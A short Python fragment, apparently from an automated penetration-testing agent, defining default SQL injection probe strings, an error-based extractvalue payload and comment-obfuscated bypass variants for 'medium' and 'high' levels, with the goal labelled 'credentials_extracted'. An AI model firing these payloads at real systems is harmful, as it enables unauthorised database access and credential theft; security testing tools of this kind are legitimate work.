"""SQLi Error-based injection agent."""
...
_CHAIN_OUTCOME = "credentials_extracted"

_DEFAULT_PROBE = ["1'", "1\"", "1 OR 1=1"]
_DEFAULT_EXPLOIT = ["1' AND extractvalue(1,concat(0x7e,database()))-- -"]
_DEFAULT_BYPASS = {
    "medium": ["1 AND extractvalue(1,concat(0x7e,database()))#"],
    "high": ["1'/**/AND/**/extractvalue(1,concat(0x7e,database()))-- -"],
}
